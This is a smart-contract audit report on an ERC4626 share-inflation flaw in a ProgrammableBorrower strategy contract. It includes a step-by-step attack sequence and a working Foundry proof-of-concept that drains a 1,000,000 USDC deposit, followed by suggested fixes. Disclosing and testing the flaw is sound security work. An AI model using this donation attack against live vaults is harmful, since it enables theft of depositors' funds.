### Title
Unprotected ERC4626 deposit permits share-inflation theft of programmable-borrower principal - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` deposits all idle underlying into a configurable ERC4626 vault without validating that the vault is inflation-resistant or that the received shares retain the deposited value. An attacker can pre-seed an empty vulnerable vault with one share, inflate its assets with a donation, and cause the borrower’s subsequent deposit to mint zero shares. [1](#0-0) 

### Finding Description
`initialize` and `setVault` validate only that the vault address is nonzero and reports the same underlying asset. [2](#0-1) [3](#0-2) 

During `onStartEpoch`, the contract snapshots its own vault-share value, deposits its full on-hand underlying balance, and marks epoch accounting active. [4](#0-3) 

The vulnerable sequence is:

1. The pool finishes its buffer phase with `D` underlying held by `ProgrammableBorrower`.
2. Before `startEpoch`, an attacker deposits `1` wei into the empty external ERC4626 vault and receives one share.
3. The attacker transfers `D` underlying directly to the vault, making the vault’s total assets approximately `D + 1` against one outstanding share.
4. `onStartEpoch` calls `_depositToVault`, which invokes `vault.deposit(D, address(this))` without a minimum-share or post-deposit value check. [1](#0-0) 
5. In an ERC4626 implementation that prices shares as `assets * supply / totalAssets`, the deposit mints `D * 1 / (D + 1) == 0` shares.
6. The attacker redeems the single share for approximately `2D + 1`, recovering the `D + 1` contribution and extracting the borrower’s `D` deposit.
7. `_currentVaultAssets()` correctly reports zero for `ProgrammableBorrower`, so the stolen principal is unavailable at epoch stop. [5](#0-4) 

`onStopEpoch` does not recover the funds: when the requested shortfall exceeds the contract’s own vault assets, it returns success and leaves the subsequent borrower transfer to fail into the CDO default path. [6](#0-5) [7](#0-6) 

### Impact Explanation
For every `D` deposited into an empty inflation-vulnerable vault, the attacker can steal approximately `D` by first contributing `D + 1` and then redeeming approximately `2D + 1`. This breaks the solvency and fair-mint invariants because the borrower’s ERC4626 deposit produces no corresponding pool-owned vault claim. The resulting CDO default can reduce active tranche and pending-claim recovery to the available reserve rather than the deposited principal. [8](#0-7) [9](#0-8) 

### Likelihood Explanation
The attack requires the configured ERC4626 vault to accept public deposits, use balance-based share pricing, and lack virtual shares, a minimum initial deposit, or equivalent inflation protection. Those properties are not checked when the vault is initialized or replaced. [10](#0-9) [3](#0-2) 

The attacker does not need a privileged role: any ERC4626 vault user can seed and donate to the vault before the manager calls `startEpoch`. The attack is especially practical for a newly configured vault with zero or dust-level supply, but can also affect later repayments routed through `_depositToVault` when a sufficiently large pre-deposit manipulation is economical. [11](#0-10) 

### Recommendation
Only integrate ERC4626 vaults with explicit inflation resistance, such as a nonzero decimals offset/virtual shares or an irrevocable protocol-owned minimum share position. Independently, `_depositToVault` should calculate the received shares’ immediately redeemable value and revert if it is materially below `_assetAmount`, for example by requiring `vault.convertToAssets(shares)` to be within an explicit rounding tolerance of the deposited assets. A `minSharesOut` or post-deposit solvency check should also be applied to deposits made during repayments. [12](#0-11) [11](#0-10) 

### Proof of Concept
The following Foundry test forks mainnet, uses USDC as the underlying, deploys a default balance-based ERC4626, and demonstrates the complete extraction of a `1,000,000 USDC` programmable-borrower deposit.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {ProgrammableBorrower} from "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract InflatableVault is ERC4626 {
    constructor(IERC20 asset_)
        ERC20("Inflatable Vault", "INF")
        ERC4626(asset_)
    {}
}

contract FakeIdleCDO {
    address public immutable token;

    constructor(address token_) {
        token = token_;
    }
}

contract ProgrammableBorrowerVaultInflationForkTest is Test {
    IERC20 internal constant USDC =
        IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function testVaultShareInflationStealsEpochDeposit() external {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

        address owner = makeAddr("owner");
        address manager = makeAddr("manager");
        address realBorrower = makeAddr("realBorrower");
        address attacker = makeAddr("attacker");

        InflatableVault vault = new InflatableVault(USDC);
        FakeIdleCDO cdo = new FakeIdleCDO(address(USDC));

        ProgrammableBorrower programmableBorrower = new ProgrammableBorrower();
        programmableBorrower.initialize(
            address(vault),
            address(cdo),
            owner,
            manager,
            realBorrower,
            0
        );

        uint256 poolDeposit = 1_000_000e6;

        // The CDO has sent pool principal to the programmable borrower during
        // the buffer period; it is still sitting on-hand before epoch start.
        deal(address(USDC), address(programmableBorrower), poolDeposit);
        deal(address(USDC), attacker, poolDeposit + 1);

        // Attacker seeds the empty vault and inflates its share price.
        vm.startPrank(attacker);
        USDC.approve(address(vault), 1);
        vault.deposit(1, attacker);
        USDC.transfer(address(vault), poolDeposit);
        vm.stopPrank();

        assertEq(vault.balanceOf(attacker), 1);
        assertEq(vault.totalAssets(), poolDeposit + 1);

        // Honest manager starts the CDO epoch. ProgrammableBorrower deposits
        // all on-hand funds and receives zero shares because:
        // poolDeposit * 1 / (poolDeposit + 1) == 0.
        vm.prank(address(cdo));
        programmableBorrower.onStartEpoch(0);

        assertEq(vault.balanceOf(address(programmableBorrower)), 0);
        assertEq(programmableBorrower.vaultSharesBalance(), 0);
        assertEq(programmableBorrower.totalUnderlying(), 0);

        // The attacker redeems the only share and extracts the pool deposit.
        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);

        assertEq(USDC.balanceOf(attacker), (2 * poolDeposit) + 1);
        assertEq(vault.totalAssets(), 0);
        assertEq(programmableBorrower.totalUnderlying(), 0);

        // At stopEpoch, a requested amount is economically uncovered. The hook
        // returns true so the later CDO transferFrom fails into the default path.
        vm.prank(address(cdo));
        bool hookResult = programmableBorrower.onStopEpoch(1, false);
        assertTrue(hookResult);
        assertEq(USDC.balanceOf(address(programmableBorrower)), 0);
    }
}
```

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L108-119)
```text
  function initialize(
    address _vault, address _idleCDO, address _owner,
    address _manager, address _borrower, uint256 _borrowerApr
  ) external initializer {
    if (
      _vault == address(0) || _owner == address(0) || _manager == address(0) ||
      _borrower == address(0) || _idleCDO == address(0)
    ) {
      revert InvalidAddress();
    }
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L158-168)
```text
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L214-222)
```text
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-246)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L374-384)
```text
  /// @notice Move a specific amount of idle underlying into the vault.
  /// @param _assetAmount Amount of underlying to deposit
  /// @param _principalAssets Portion of the deposited assets that should extend the epoch principal
  /// baseline instead of being recognized as current-epoch profit.
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L524-527)
```text
    if (epochAccountingActive) {
      // Current-epoch borrower interest must remain visible as profit at stopEpoch, while principal,
      // previously-fronted debt, and any excess repayment should only extend the epoch principal baseline.
      _depositToVault(totalRepaidAssets, totalRepaidAssets - currentEpochInterestPaid);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L536-549)
```text
  function totalUnderlying() external view returns (uint256) {
    return underlyingToken.balanceOf(address(this)) + _currentVaultAssets();
  }

  /// @notice Return the current vault share balance held by this contract.
  function vaultSharesBalance() external view returns (uint256) {
    return vault.balanceOf(address(this));
  }

  /// @notice Convert the current vault share position into underlying terms.
  function _currentVaultAssets() internal view returns (uint256) {
    uint256 shares = vault.balanceOf(address(this));
    return shares == 0 ? 0 : vault.convertToAssets(shares);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L395-405)
```text
    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

```

**File:** contracts/IdleCDOEpochVariant.sol (L501-505)
```text
    } catch {
      // if borrower defaults, prev instant withdraw requests can still be withdrawn
      // as were already fullfilled prior to the default (all funds already sent to the strategy)
      _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
    }
```
